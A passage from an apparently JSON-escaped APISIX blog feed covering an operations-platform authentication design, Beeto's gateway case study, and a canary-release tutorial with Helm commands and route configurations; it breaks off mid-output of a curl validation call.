CMDBuild to facilitate interaction;\\r\\n\\r\\n  - OpenLDAP: used for user account authentication, not for authentication;\\r\\n\\r\\n  - Workflow [Activiti](https://github.com/Activiti/Activiti): the official RestAPI service is used. Since it is behind the gateway, there is no need to consider security issues.\\r\\n\\r\\n## Business scenario\\r\\n\\r\\n### User login and authority verification\\r\\n\\r\\nFor all Web frameworks, user login is a mandatory option, and I will introduce this scenario to you next.\\r\\n\\r\\n![User Logins](https://static.apiseven.com/2022/blog/0614/auto-en2.png)\\r\\n\\r\\nFirst of all, we need to understand the relevant components we use in the scenario. The first is the access front end, which is outside the gateway. Secondly, we use the APISIX cloud native API gateway as the business boundary. Then the auth service, which is a self-defined microservice, is used to verify the front-end URL request and user login request, and issue tokens to authenticated users. LDAP stores the company\'s internal password information. CMDB stores some business-related information, including organizational structure, some organizational information about the permissions that can be accessed, and finally the pages that the front end needs to access.\\r\\n\\r\\nAfter understanding the above components, let\'s introduce the overall process:\\r\\n\\r\\nWhen users log in, they first need to query through the gateway to see if the page they visit is in the white list. Because some pages do not need permission verification, such as the default page or some error pages. If the accessed page needs to verify a login, these requests will be forwarded to the authority authentication service through the relevant plugins.\\r\\n\\r\\nIn authority authentication, the authentication service will query whether the account is correct from LDAP according to the incoming \\"user name\\" and \\"password\\". If it is correct, the organization to which the user belongs and which function modules can be viewed will be queried through the CMDB; After obtaining the result, use the JWT plugin of APISIX to generate a token according to the user information, add the expiration time, and return it to the front end; The user stores tokens through cookies. If the user continues to access later, the gateway will call the previously stored token from the cookie to verify whether the current user can continue to access the following pages.\\r\\n\\r\\nHere, we use the [`consumer restriction`](https://apisix.apache.org/zh/docs/apisix/plugins/consumer-restriction/) plugin of APISIX. The authority authentication mentioned above is completed through the [`consumer restriction`](https://apisix.apache.org/zh/docs/apisix/plugins/consumer-restriction/) plugin, and we do not need to repeatedly authenticate in the background.\\r\\n\\r\\nThrough the above description, I believe you have a certain understanding of the normal request process. Next, I will introduce you to the scenarios of how to judge the insufficient permissions of these users. In the operation and maintenance platform, if there is an operation involving data change, a token must be carried. When the token is verified by the ACL interface that it has no access, it will directly return to a page that is forbidden to access for the front end to the process. The following is the specific process of user login and permission verification scenarios and the related components used more.\\r\\n\\r\\n![Schematic Diagram](https://static.apiseven.com/2022/blog/0614/auto-en3.png)\\r\\n\\r\\n### New service microservice access\\r\\n\\r\\n![Microservice Access](https://static.apiseven.com/2022/blog/0614/auto-en4.png)\\r\\n\\r\\nIn our daily work, we often launch some microservices, so how can we connect this microservice to the automatic operation and maintenance platform?\\r\\n\\r\\nWe internally stipulate that no matter which language engineers use to develop microservices, they need to use YAPI to define the API. Therefore, YAPI controls all the URLs we can access, and a unified entry is here. Because YAPI supports the definition of various environments, we have defined different operating environments in YAPI. The most typical example is: in the production environment, we use domain names to access; In the development environment, `127.0.0.1` is directly used for access. After completing the definition of YAPI, it can generate a series of request cases through mock, which is very conducive to subsequent production environment testing. All microservice interfaces can mock through HTTP requests.\\r\\n\\r\\nNext, is the permission management service. All operations here are automatic: it will read the API definition from Yapi, and then generate a series of ACL rules. For permission management, we use a management page in the platform: the administrator can manage the URL access rules through this page. After setting, the form data will be changed into a series of ACL permission definitions and stored in the database. In the process of service startup, the cachebin access model used by the platform will directly load these rules from the database into memory, and then generate a series of consumer definitions and routing tables of APISIX, which will be written into the etcd of APISIX. After the above operations are completed, when users access, the platform can directly perform permission management through APISIX.\\r\\n\\r\\nThe model is not only applicable to the automatic operation and maintenance platform but also applicable to various small and medium-sized business systems.\\r\\n\\r\\n## Technical details\\r\\n\\r\\nThrough the above scenario description, I believe you have a general understanding of the whole system. Next, I will introduce some technical details to you.\\r\\n\\r\\n![Technical Details](https://static.apiseven.com/2022/06/blog/1/173297301-6ee14d6e-8398-4b34-80ce-4b04ce053bad.png)\\r\\n\\r\\nBecause APISIX is implemented based on NGINX+Lua, some functions need to be implemented through NGINX libraries. From the above figure, we can see where various Lua scripts can be cut into NGINX. In this article, we mainly introduce the operations that can be performed in the rewrite/access and content phases.\\r\\n\\r\\nIn the rewrite/access phase, the message has not been transferred upstream, so various data preprocessing can be performed in this phase. From the above figure, we can see that there is an access_by_Lua. In this phase, the deny command can be used to manage permissions, including interface permissions and IP access white list. The plugin acl_plugin.lua, described later, is implemented at this stage.\\r\\n\\r\\nSecond, in `access` stage is often used to insert some additional `key:value` in the HTTP request header for subsequent use when requesting access. For example, when we need online gray-scale publishing, we can add flag bits to the user\'s request header. Through these flag bits, we can control which back-end services these requests forward, to realize gray-scale publishing. Of course, we can also use the [`traffic split`](https://apisix.apache.org/zh/docs/apisix/plugins/traffic-split) plugin of APISIX to realize grayscale publishing.\\r\\n\\r\\nFinally, `log_by_Lua` stage. In this stage, we can directly input some trace information or some fault information into the log file. Similarly, APISIX also provides many plugins for loggers, including `skywalking-logger`, `kafka-logger`, `rocketmq-logger`, and so on.\\r\\n\\r\\n### Custom plugins `acl-plugin.lua`\\r\\n\\r\\nThe implementation of the [`acl-plugin.lua`](https://raw.githubusercontent.com/chenqing24/ops-apisix/main/centos/acl-plugin.lua) plugin is very simple. First, when the user is requesting, we will add the relevant JWT token to the user and store it in the cookie. Then the user will extract the JWT token from the accessed cookie, decode the token and obtain the user information.\\r\\n\\r\\nIn the rewrite phase, the user ID, method, and URI are used to send a request to the background ACL interface for permission verification. If it passes, relevant information will be recorded in the log for future security authentication. If it fails, it directly returns an error status code and records it in the error log.\\r\\n\\r\\nIn APISIX version 1.1, the `cors` plugin was not released at that time. Therefore, we also implement cross-domain requests through this plugin. WWhen the request uses the GET and POST request methods, it will be processed. For other requests, they will be passed directly. Now, they can be implemented directly using the `cors` plugin of APISIX. APISIX can also use multiple languages to develop plugins, not just Lua. For details, please refer to: https://apisix.apache.org/zh/docs/apisix/plugin-develop.\\r\\n\\r\\n### Auth service\\r\\n\\r\\nThe Auth service is an authentication service that comes with the `acl-plugin.lua` plugin.The function of this service is very simple. It mainly reads the information in the request message, decodes the required authentication element, and then forwards it to the relevant service interface. The service interface will return the corresponding result according to the authentication information, and APISIX will reject or pass the request according to the result.\\r\\n\\r\\nThe core function of auth service is to load ACL rules from a database into memory. The main functions are divided into two parts:\\r\\n\\r\\n- First, is the account interface. The main function of this interface is to send user-related information to the LDAP service for authentication if permission authentication is required during user access. If the authentication passes, the relevant information accessible to the user will be queried from the CMDB, and then together with the user role, expiration time, and other elements, a JWT token will be formed, and a cookie will be generated and returned to the user. At the same time, a consumer will be registered in APISIX for the user information. The interface also implements an ACL_ The check function is responsible for verifying the user authentication information and determining whether the authentication is successful or failed.\\r\\n\\r\\n- The second is YPAI interface. The main function of this interface is to interact with YAPI. Because there is a token in YAPI for the project to access. With this token, you can read all the API definitions of the project. Therefore, the main function of this interface is to read the HTTP interface definition of API from YAPI, store it in the database, then interact with the permission management page in a form, combine it into an ACL table, and finally generate a series of Casbin rules and store them in the database.\\r\\n\\r\\n## Summary\\r\\n\\r\\nThe above is an introduction to the architecture and some scenarios of the automatic operation and maintenance platform of Tongcheng Digital Technology Co., Ltd. based on Apache APISIX. Now, APISIX is becoming more and more powerful. It supports plugin development using Wasm and Python. The ecology of Apache APISIX is also very strong. If you have any questions, you are welcome to communicate and discuss in the community."},{"id":"Practice of localized application with API gateway in the Middle East","metadata":{"permalink":"/blog/2022/06/14/beeto-with-apache-apisix","source":"@site/blog/2022/06/14/beeto-with-apache-apisix.md","title":"Practice of localized application with API gateway in the Middle East","description":"This article introduces how the Middle East social software Beeto uses APISIX to achieve localized deployment in security and scalability.","date":"2022-06-14T00:00:00.000Z","formattedDate":"June 14, 2022","tags":[{"label":"Case Studies","permalink":"/blog/tags/case-studies"}],"readingTime":12.73,"truncated":true,"authors":[{"name":"Lilin Hu","title":"Author"},{"name":"Sylvia","title":"Technical Writer","url":"https://github.com/SylviaBABY","image_url":"https://avatars.githubusercontent.com/u/39793568?v=4","imageURL":"https://avatars.githubusercontent.com/u/39793568?v=4"}],"prevItem":{"title":"Build automated operation platform based on Apache APISIX","permalink":"/blog/2022/06/14/automated-operation-base-apache-apisix"},"nextItem":{"title":"Implementation of canary release solution based on Apache APISIX","permalink":"/blog/2022/06/14/how-mse-supports-canary-release-with-apache-apisix"}},"content":"> This article is based on the sharing made by Hu Lilin (Beeto Platform R&D) at the [Apache APISIX Summit ASIA 2022](https://apisix-summit.org/), and introduces how the Middle East social software Beeto uses APISIX to achieve localized deployment.\\n\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nBeeto is a social app for the Middle East market focusing on Arabic language, with localized product design and technical architecture. It has been ranked No.4 in the Top Charts list of Saudi iOS app store, surpassing the old social giant Facebook.\\n\\nIn fact, the Middle East is considered a more mature region in the Internet field, with a very high penetration of active users in social networks, especially in the Saudi region, where the Internet users have reached 90% in 2019, and the penetration rate of active users in Saudi Arabia will already be ranked 9th in 2020.\\n\\nThe maturity of the Internet market has brought about international software coverage, with the likes of WhatsApp, YouTube and Instagram being the mainstream local social software. But looking back, you will find that there is basically no localized social software in the Middle East like Weibo in China. Therefore, before Beeto was born, we aimed at the direction of \\"Middle East Internet is mature and high penetration rate, but little localization\\" and started to prepare the product focusing on \\"localization features\\".\\n\\n![Localization appeal](https://static.apiseven.com/2022/06/blog/beeto-en1.png)\\n\\nBeeto in the Middle East is actually benchmarked against feed stream applications like Twitter and Facebook, so a relatively complete framework was planned from the beginning in the deployment of the business architecture. For example, to meet the social attributes of relationship interaction, content consumption (graphics, live video, crosstown advertising, etc.), as well as financial and service categories of reward, cash withdrawal, voting and lottery, and other kinds of business, and even including the platform side of the regulation, content security audit and other requirements.\\n\\nAs we mentioned earlier, the maturity of the Internet in the Middle East market is bound to have high quality requirements for a product launch, so to effectively enter the Middle East market, it is not possible to make a simple functional application first and go live.\\n\\nSo the first version of Beeto\'s business structure is a complete, and in line with the mainstream social software should have a variety of features in one product. At the same time, Beeto\'s goal was clear: to become the largest Arabic social platform and the best Arabic community in the Middle East with \\"localized features\\".\\n\\n## Pain points in architecture design\\n\\nIn order to go local, Beeto needs to meet the existing local social needs at the business level, but also needs to do some localization operations at the technical level, such as service deployment and data storage. Technical friends familiar with Weibo or Twitter should know that it takes dozens or even hundreds of architectural systems to collaborate behind such a huge information flow product.\\n\\n### Monolithic Service\\n\\n![Service division](https://static.apiseven.com/2022/06/blog/beeto-en2.png)\\n\\nThe current Beeto product\'s services can be divided into these categories. The implementation of these services actually needs to be deployed locally in the Middle East. If we split each business by service, each service is actually a separate monolithic architecture.\\n\\n![monolithic architecture](https://static.apiseven.com/2022/blog/0614/beeto-en3.png)\\n\\nThe above diagram shows a very common deployment architecture. Take Beeto\'s feed stream service, if you want to realize the user browsing feed stream demand, you have to support public network access, i.e. north-south traffic access; at the same time, the feed stream service will also provide some internal calls in the form of similar topic business, i.e. east-west traffic calls. Therefore, the overall service property is to explicitly support both external and internal invocation modes, and user traffic is load balanced through seven layers and assigned to different servers before invoking different storage resources, similar to the east-west direction. The whole seven-tier cluster is responsible for handling north-south and east-west traffic, load balancing, security authentication and node monitoring.\\n\\nWhen the services of multiple services are combined together, the overall architecture is formed as shown below.\\n\\n![Overall architecture](https://static.apiseven.com/2022/blog/0614/beeto-en4.png)\\n\\nAs you can see, several services exist in both the adaptation layer, the business layer and the basic service layer. The deployment architecture of each service has the single architectural details mentioned earlier, so there are several seven-tier clusters in between, which is actually a very large and complex set of system architecture already.\\n\\nBut because the current Beeto product is still in the start-up phase, especially the product itself in the Middle East local landing, while the R & D staff in China situation, according to the above-mentioned scale deployment, need to invest very large server costs and maintenance costs. Also later as business increases, the number of individual services will inevitably increase, both in terms of cost and O&M operations will become more difficult to control.\\n\\n### Difficulty in landing multiple services\\n\\nIn addition to the complexity of deploying the architecture mentioned above, the invocation between services within the cluster is actually very complex.\\n\\nNorth-south traffic is dispersed across service pools, and east-west traffic is interspersed across services, with the invocation relationships between these services intertwined. For each set of services, these invocation relationships need to be maintained, resulting in unclear and unmanageable invocation chains.\\n\\n![Technical stack differentiation](https://static.apiseven.com/2022/06/blog/beeto-5.png)\\n\\nIn addition to the complexity of the invocation relationship, there are also differences in the technology stack between each service. For example, in terms of invocation protocols, some services provide HTTP while others are RPC; and in terms of development languages, there is a mix of Java, Go, and other languages.\\n\\nFrom these details, it can be seen that such a multi-service architecture system will obviously expose the problem of high deployment and maintenance costs when local implementation is carried out, while each set of seven layers of services requires investment in server costs, and the differences in the traffic of each service will lead to uneven traffic, resulting in low utilization of resources such as servers, resulting in a waste of resources.\\n\\nSince the current cost of Beeto is focused on business upgrades and iterations, the architecture design is more inclined to facilitate maintenance and unified management, so how to achieve this goal?\\n\\n## APISIX for Beeto architecture\\n\\nIn order to solve the pain point of inconvenient service management and high cost investment, and to benefit from the dynamic performance of APISIX with etcd which is more in line with Beeto\'s product requirements, APISIX was introduced as a gateway in the architecture deployment and a cluster of gateways was built, as shown in the figure below.\\n\\n![New architecture](https://static.apiseven.com/2022/blog/0614/beeto-en6.png)\\n\\nThe gateway cluster provides extension tools such as registry, service control, service monitoring, protocol forwarding and application plugins for all services. The clusters of each service can be registered at the gateway in a unified manner, and new services up and down can all be done directly through the gateway.\\n\\n![Cluster link](https://static.apiseven.com/2022/blog/0614/beeto-en7.png)\\n\\nAlso with the introduction of gateways, the call links for the entire cluster become very clear. North-south traffic is routed and forwarded by the gateway, while east-west traffic is forwarded by the gateway for services on the intranet. At the functional level, APISIX is responsible for unified maintenance of the authentication invoked by these traffic flows, so that the performance differences and traffic differences between the services are clearly understood at the gateway level.\\n\\nTo summarize, the introduction of APISIX gateways for architectural integration.\\n\\n- Solved the problem of unified north-south and east-west traffic, saved resources and labor costs, and realized dynamic and unified management.\\n- The deployment architecture of business services focuses on the services themselves, thus realizing the independent existence of the gateway and business insensitivity.\\n- Through extension plugins, functions such as permission verification, route distribution and health check of each service are hosted by the gateway.\\n- New business go-live and service migration can be done dynamically, which is very friendly to operation and maintenance.\\n\\nOf course, as the gateway carries all the traffic in this architecture, the number of services will increase later as the services continue to expand, and the maintenance cost of the gateway will then increase, and new response options will need to be considered. However, in the current context, this solution is still the optimal choice.\\n\\n## Practices applying APISIX\\n\\nApache APISIX as a gateway can handle multiple policies such as security authentication, service forwarding, and health checks in a unified way at the gateway layer. Therefore, Beeto has done a lot of experimentation at the business practice level after the introduction of APISIX.\\n\\n### Security: Authentication Plugin\\n\\n#### North-South Traffic: Cookie\\n\\nWe talked earlier about the public network users\' access traffic uniformly passing through the gateway. The authentication for public network users is based on user requests authenticated by cookies. When a user request arrives at the gateway carrying a cookie, it is authenticated at the gateway by an authentication plugin.\\n\\n![Cookie handling process](https://static.apiseven.com/2022/blog/0614/beeto-en8.png)\\n\\nAs shown in the flowchart above, the plugin internally performs localization validation and then performs authentication verification of the remote service according to the policy. When the request completes the cookie verification, it is then forwarded to the specified service.\\n\\nThe advantages of doing so are mainly in two aspects.\\n\\n- The information security of user cookies is ensured. Because cookies are sensitive data, the execution process ensures that only the gateway layer can receive and process them, and no other business layers can access them. Prevent security problems caused by inconsistent business processing rules, but also effectively avoid the human factor and irregularities caused by cookie leakage and other security issues.\\n- Reduce the complexity of each service cookie authentication. As mentioned above, cookies need to be verified locally or remotely in the process, and when cookies are upgraded, each service needs to be upgraded simultaneously. Through the gateway for unified management and verification, in the processing of business services to eliminate the cost of verification, only need to focus on the results, using the results of business rules processing, thus ensuring that each business processing more focused on the business itself.\\n\\n#### East-West Traffic: Token\\n\\nIn the diagram below, Service A calls Service B. Generally speaking, it is only necessary to provide an API when calling each other. However, in the internal process, we need to understand \\"who called the API, how it was called, whether permission verification is required, and whether the researcher needs to be controlled\\", and so on, which need to be handled internally.\\n\\n![Token handling process](https://static.apiseven.com/2022/blog/0614/beeto-en9.png)\\n\\nWith the APISIX gateway, the process becomes much simpler. All the internal service calls only need to register with the Auth Authentication Service, and each service is issued an App key, which is used to indicate the identity ID of the service. After the authentication is passed, the authentication mark will be passed to the invoked service, and the whole process will be unified for authentication registration and completion of mutual invocation.\\n\\nThanks to the Token rule of App key, the above operation is easy to trace the source of invocation, so as to carry out troubleshooting and permission control, and also play an effective control on illegal invocation.\\n\\nSo whether it is the authentication of north-south traffic or east-west traffic, the advantage of unified authentication is to ensure the security and uniformity of the cluster, and it is very helpful in problem identification and invocation control.\\n\\n### Scalability: Stateless Service Scaling Migration\\n\\nThe overall deployment architecture of Beeto\'s clusters is based on APISIX gateway clusters - stateless service business service clusters - stateful service data center clusters from top to bottom. When deployed locally in the Middle East, they are deployed on major cloud clusters. According to the scale of cloud coverage in the Middle East and the cloud vendors in different regions, the expansion and migration of cloud services need to be considered when deploying the services.\\n\\nIn the process of migration, Beeto focused on the migration of stateless services. Because of the migration cost of the data center, it is not suitable to do dynamic adjustment; at the same time, most of the request pressure is carried by the stateless service, so it is very important to ensure that the stateless service has a good scalability premise.\\n\\n![Migration process](https://static.apiseven.com/2022/blog/0614/beeto-en10.png)\\n\\nIn Beeto\'s architecture, service scalability is mainly reflected in two aspects, namely, individual service scalability and overall cluster scalability. For example, if a single service runs out of resources and needs to be scaled up, APISIX gateways can be used to dynamically add nodes to achieve the scaling. Similarly, in cross-cluster or cross-cloud situations, cluster scalability can be achieved by deploying multiple APISIX gateways and migrating different services to different gateway nodes.\\n\\nFor business services, the overall architecture remains unchanged, and dynamic scaling of individual services and service migration can be achieved at the gateway layer. The scheme and objectives of the whole process are clear, and once changes are involved, they do not cause instability of the overall architecture.\\n\\n### Functional Extensibility: Business Dynamic Forwarding\\n\\nIn addition to these familiar gateway general scenarios, Apache APISIX also provides a great help to Beeto at the business dynamic forwarding level.\\n\\nThose who are familiar with the UI and back-end of APP should know that different product pages are provided by different services. A page is made up of different modules, and the content of them is all sent from the interface. What module\'s data is sent down from the interface is rendered as what on the end. This is a joint client-side rendering specification, which aims to make the client-side rendering process more generic and the business processing more flexible.\\n\\nFor example, in the implementation of PageA above, the client calls the interface of Service A, sends the corresponding module data, and completes the rendering of PageA. This operation causes a problem, the client needs to maintain each page and interface to each service. If the content changes, it is necessary to make a release solution, which is not friendly in terms of operability and efficiency.\\n\\nThe main idea to solve the above problem is to realize the unified distribution of services in the overall architecture. That is, the client first unifies the request interface address, forwards all requests of this type to one interface, processes the request parameters and URL rules for the URL address at the gateway layer, and then introduces the distribution plugin. Finally, according to the configuration rules, the parsed requests are forwarded directly to the specified services at the gateway layer.\\n\\n![Business dynamic forwarding](https://static.apiseven.com/2022/blog/0614/beeto-en12.png)\\n\\nThe client only needs to determine the rendering specification throughout the process and does not need to care about the source of the data. The gateway layer takes the responsibility of service distribution and forwards the traffic directly. Meanwhile, the plugin configuration file in APISIX can be dynamically updated in real time, and the forwarding rules can be dynamically adjusted, which is very flexible. In fact, for applications like BFF (Backend for Frontend) architecture, such requirements can be solved at the gateway layer.\\n\\n## Summary\\n\\nThis article presents Beeto\'s design thinking and business-level application practices after the introduction of Apache APISIX gateway from Beeto\'s product design perspective. With the support of APISIX gateway, it helps Beeto to realize the scenario of localized deployment, unified management and friendly operation and maintenance in the Middle East, while controlling the resource cost and business product lines."},{"id":"Implementation of canary release solution based on Apache APISIX","metadata":{"permalink":"/blog/2022/06/14/how-mse-supports-canary-release-with-apache-apisix","source":"@site/blog/2022/06/14/how-mse-supports-canary-release-with-apache-apisix.md","title":"Implementation of canary release solution based on Apache APISIX","description":"This article describes how Alibaba Cloud\'s MSE based on APISIX\'s flexible route capabilities, with MSE to release new value from APISIX.","date":"2022-06-14T00:00:00.000Z","formattedDate":"June 14, 2022","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":10,"truncated":true,"authors":[{"name":"Shengwei Pan","title":"Author"},{"name":"Fei Han","title":"Technical Writer","url":"https://github.com/hf400159","image_url":"https://github.com/hf400159.png","imageURL":"https://github.com/hf400159.png"}],"prevItem":{"title":"Practice of localized application with API gateway in the Middle East","permalink":"/blog/2022/06/14/beeto-with-apache-apisix"},"nextItem":{"title":"Architecture evolution of investment platforms with API gateway","permalink":"/blog/2022/06/14/xueqiu-with-apache-apisix"}},"content":"> This article describes how Alibaba Cloud\'s microservice engine MSE is based on the flexible routing capabilities of Apache APISIX, cooperates with MSE\'s full-link grayscale capabilities, and achieves full-link grayscale through minimal configuration and code-free intrusion.\\r\\n\\r\\n\x3c!--truncate--\x3e\\r\\n\\r\\nApache APISIX is an open-source cloud native API gateway. As an API gateway, it has the characteristics of dynamic, real-time, and high performance. It provides rich traffic management functions such as load balancing, dynamic upstream, gray-scale publishing, service fusing, identity authentication and observability. You can use Apache APISIX to handle the traditional north-south traffic and the east-west traffic between services. It can also be used as a K8s ingress controller. Thanks to the full dynamic design of APISIX, configuration changes can be made at any time without restarting the service.\\r\\n\\r\\nAlibaba cloud microservice engine MSE provides a very easy-to-use traffic swimlane capability. It is implemented based on Java agent bytecode enhanced technology. It seamlessly supports all Spring Cloud and Dubbo versions on the market for nearly five years. Through minimal configuration and code intrusion-free methods, it realizes a canary release solution along the whole life cycle and releases the new value of the APISIX based microservice architecture.\\r\\n\\r\\n## Introduction of canary release solution along the whole life cycle\\r\\n\\r\\n### Relevant concepts\\r\\n\\r\\n- Swimlane: a set of isolated environments defined for the same version application. Only the request traffic that meets the flow control routing rules will be routed to the marking application in the corresponding lane. An application can belong to multiple swimlanes. A swimlane can contain multiple applications. The relationship between applications and swimlanes is many to many.\\r\\n\\r\\n- Baseline environment: an application that is not marked is an application of a stable version of the baseline, that is, a stable online environment.\\r\\n\\r\\n- Traffic fallback: the number of services deployed in the swimlane is not required to be completely consistent with the baseline environment. When there are no other services that the call chain depends on in the swimlane, the traffic needs to be fallback to the baseline environment and further routed back to the swimlane of the corresponding label when necessary.\\r\\n\\r\\n- Lane Group: a collection of lanes. The swimlane group is mainly used to distinguish different teams or different scenes.\\r\\n\\r\\n### Business scenario\\r\\n\\r\\nThe capability of canary release solution along the whole life cycle based on traffic lanes is applicable to the following business scenarios:\\r\\n\\r\\n- Daily development / project / test environment isolation;\\r\\n- Canary release solution along the whole life cycle;\\r\\n- High availability same machine room priority routing;\\r\\n- Full link pressure test.\\r\\n\\r\\n### Technical principles\\r\\n\\r\\nHow to quickly implement canary release solution along the whole life cycle in the actual business scenario? At present, there are two main solutions, physical environment based isolation and logical environment based isolation.\\r\\n\\r\\n#### Physical environment isolation\\r\\n\\r\\nPhysical environment isolation, in fact, is to build real traffic isolation by adding machines.\\r\\n\\r\\n![Physical environment isolation](https://static.apiseven.com/2022/blog/0614/mse-en1.png)\\r\\n\\r\\nThis scheme needs to build a set of network isolated and resource-independent environments for canary services, and deploy the canary version of the services in it. Because it is isolated from the formal environment, other services in the formal environment cannot access the services that need canary release. Therefore, these online services need to be deployed redundantly in the canary deployment so that the entire call link can forward traffic normally. In addition, some other dependent middleware components such as the registry also need to be redundantly deployed in the canary deployment to ensure the visibility between microservices and ensure that the obtained node IP address only belongs to the current network environment.\\r\\n\\r\\nThis scheme is generally used to build enterprise testing and pre development environment, but it is not flexible enough for the scenarios of online canary release and drainage. Moreover, the existence of multiple versions of microservices is very common in a microservice architecture. It is necessary to maintain multiple sets of canary deployments by using heap machines for these business scenarios. If the number of applications is very small, this method can be accepted; If you have too many applications, the operation and maintenance costs and machine costs will be too large, and the costs and costs will far exceed the benefits.\\r\\n\\r\\n#### Logical environment isolation\\r\\n\\r\\nThe other scheme is to build a logical environment isolation. We only need to deploy the canary version of the service. When the traffic flows on the call link, the gateway, each middleware and each micro service passing through will identify the canary traffic and dynamically forward it to the canary version of the corresponding service. As shown below:\\r\\n\\r\\n![Logical environment isolation](https://static.apiseven.com/2022/blog/0614/mse-en2.png)\\r\\n\\r\\nThe above figure can well show the effect of this scheme. We use different colors to represent the canary traffic of different versions. It can be seen that both the microservice gateway and the microservice itself need to identify the traffic and make dynamic decisions according to the governance rules. When the service version changes, the forwarding of this call link will also change in real time. Compared with the canary deployment built by machines, this scheme can not only save a lot of machine costs and operation and maintenance manpower, but also help developers to control the online traffic in real time and quickly.\\r\\n\\r\\n## Canary release solution along the whole life cycle based on Apache APISIX\\r\\n\\r\\nCanary release along the whole life cycle is one of the core functions of microservices, and it is also a function that cloud users must have in the process of microservicing. Due to the large number of technologies and scenarios involved in the canary release along the whole life cycle, if the enterprise implements self realization one by one, it will need to spend a lot of labor costs to expand and operate it.\\r\\n\\r\\nMSE service governance provides a complete product based canary release solution along the whole life cycle, covering most scenarios such as RPC, MQ, and observability. As long as the architecture is based on the spring cloud or Dubbo framework, the application can realize the enterprise level canary release along the whole life cycle function without upgrading or code changes.\\r\\n\\r\\n### Prerequisites for use\\r\\n\\r\\n#### Step 1: Install APISIX related components\\r\\n\\r\\n1. Install APISIX, apisix-ingress-controller, etc. components.\\r\\n\\r\\n```C++\\r\\nhelm repo add apisix https://charts.apiseven.com\\r\\nhelm repo add bitnami https://charts.bitnami.com/bitnami\\r\\nhelm repo update\\r\\nkubectl create ns ingress-apisix\\r\\nhelm install apisix apisix/apisix \\\\\\r\\n  --set gateway.type=LoadBalancer \\\\\\r\\n  --set ingress-controller.enabled=true \\\\\\r\\n  --set etcd.persistence.storageClass=\\"alicloud-disk-ssd\\" \\\\\\r\\n  --set etcd.persistence.size=\\"20Gi\\" \\\\\\r\\n  --namespace ingress-apisix \\\\\\r\\n  --set ingress-controller.config.apisix.serviceNamespace=ingress-apisix\\r\\nkubectl get service --namespace ingress-apisix\\r\\n```\\r\\n\\r\\nUnder the `ingress-apisix` namespace you can see the stateless APISIX and `apisix-ingress-controller` applications, as well as the stateful etcd application.\\r\\n\\r\\n2. Use Helm to install APISIX Dashboard.\\r\\n\\r\\n```SQL\\r\\nhelm repo add apisix https://charts.apiseven.com\\r\\nhelm repo update\\r\\nhelm install apisix-dashboard apisix/apisix-dashboard --namespace\\r\\ningress-apisix\\r\\n```\\r\\n\\r\\n3. After installation, you can bind an SLB. 4.\\r\\n\\r\\n4. Access APISIX Dashboard via `{slb-ip}:9000`.\\r\\n\\r\\n![Dashboard](https://static.apiseven.com/2022/06/blog/2/173316825-e590decb-4c35-4602-9590-41ddde8b93cf.png)\\r\\n\\r\\n#### Step 2: Enable microservice governance\\r\\n\\r\\nIn this step, you need to enable MSE microservice governance, install the MSE service governance component (ack-onepilot) and enable microservice governance for applications. For specific operation information, please refer to the official Alibaba cloud tutorial.\\r\\n\\r\\n#### Step 3: Deploy the demo application\\r\\n\\r\\nDeploy three applications A, B, and C in Alibaba cloud container service. Each application deploys a `base` version and a `gray` version respectively, and deploy a Nacos server applications to realize service discovery. For details, please refer to this tutorial to complete application deployment: deploy demo application. After the deployment is completed, you can configure the service for the application through the apisik dashboard for upstream configuration.\\r\\n\\r\\n### Scenario 1: Routing by domain name\\r\\n\\r\\nIn some scenarios, the baseline environment and gray environment on the line can be distinguished by different domain names. Gray environment has a separate domain name that can be configured. Suppose we visit www.gray.com to request gray environment, visit www.base.com is the baseline environment.\\r\\n\\r\\n![Scenario 1](https://static.apiseven.com/2022/06/blog/2/173319294-d27fc48a-4d42-4578-9457-4ab9072528a4.png)\\r\\n\\r\\nCall the link `Ingress-nginx - > A - > B - > C`, where a can be a `spring-boot` application.\\r\\n\\r\\n#### Configure APISIX routing rules\\r\\n\\r\\nSelect a route in the APISIX Dashboard and click to create. In the matching criteria, select the domain name and request path `/*`, and select the corresponding upstream. Configure the following routes respectively:\\r\\n\\r\\n- When the `host` is `www.base.com`, it is routed to the upstream corresponding to ID `4011524535454748`, that is, spring-cloud-a-svc;\\r\\n\\r\\n- When the host is `www.gray.com`, it is routed to the upstream corresponding to ID `401163331936715388`, that is, `spring-cloud-a-gray-svc`.\\r\\n\\r\\nThen configure the route corresponding to the base:\\r\\n\\r\\n```json\\r\\n{\\r\\n  \\"uri\\": \\"/*\\",\\r\\n  \\"name\\": \\"spring-cloud-a\\",\\r\\n  \\"methods\\": [\\r\\n    \\"GET\\",\\r\\n    \\"POST\\",\\r\\n    \\"PUT\\",\\r\\n    \\"DELETE\\",\\r\\n    \\"PATCH\\",\\r\\n    \\"HEAD\\",\\r\\n    \\"OPTIONS\\",\\r\\n    \\"CONNECT\\",\\r\\n    \\"TRACE\\"\\r\\n  ],\\r\\n  \\"host\\": \\"www.base.com\\",\\r\\n  \\"upstream_id\\": \\"401152455435354748\\",\\r\\n  \\"labels\\": {\\r\\n  \\"API_VERSION\\": \\"0.0.1\\"\\r\\n  },\\r\\n  \\"status\\": 1\\r\\n}\\r\\n```\\r\\n\\r\\nConfigure the route corresponding to `gray`:\\r\\n\\r\\n```json\\r\\n{\\r\\n  \\"uri\\": \\"/*\\",\\r\\n  \\"name\\": \\"spring-cloud-a-gray\\",\\r\\n  \\"priority\\": 1,\\r\\n  \\"methods\\": [\\r\\n    \\"GET\\",\\r\\n    \\"POST\\",\\r\\n    \\"PUT\\",\\r\\n    \\"DELETE\\",\\r\\n    \\"PATCH\\",\\r\\n    \\"HEAD\\",\\r\\n    \\"OPTIONS\\",\\r\\n    \\"CONNECT\\",\\r\\n    \\"TRACE\\"\\r\\n  ],\\r\\n  \\"host\\": \\"www.gray.com\\",\\r\\n  \\"upstream_id\\": \\"401163331936715388\\",\\r\\n  \\"labels\\": {\\r\\n    \\"API_VERSION\\": \\"0.0.1\\"\\r\\n  },\\r\\n  \\"status\\": 1\\r\\n}\\r\\n```\\r\\n\\r\\n#### Configure canary release along the whole life cycle of MSE\\r\\n\\r\\nYou need to configure the full link publishing of MSE. For details, please refer to this tutorial: [Configuring full link grayscale](https://help.aliyun.com/document_detail/404845.html).\\r\\n\\r\\n#### Validation of results\\r\\n\\r\\nVisit `www.base.com` route to the `base` version of A application:\\r\\n\\r\\n```Nginx\\r\\ncurl -H\\"Host:www.base.com\\" http://47.97.253.177/a\\r\\nA[172.18.144.15] -> B[172.18.144.125] -> 